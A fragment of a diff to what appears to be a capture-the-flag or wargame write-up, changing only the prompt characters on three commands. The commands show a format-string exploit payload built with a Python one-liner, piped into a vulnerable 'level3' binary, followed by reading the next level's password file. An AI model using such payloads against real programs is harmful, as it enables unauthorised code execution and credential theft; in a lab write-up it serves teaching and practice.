@@ -27,7 +27,7 @@ AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
 ```
 The offset is 4. Now we construct the payload for exploitation:
 ```
-$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload
-$ cat /tmp/payload - | ./level3
-$ cat /home/user/level4/.pass
+python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload
+cat /tmp/payload - | ./level3
+cat /home/user/level4/.pass
 ```
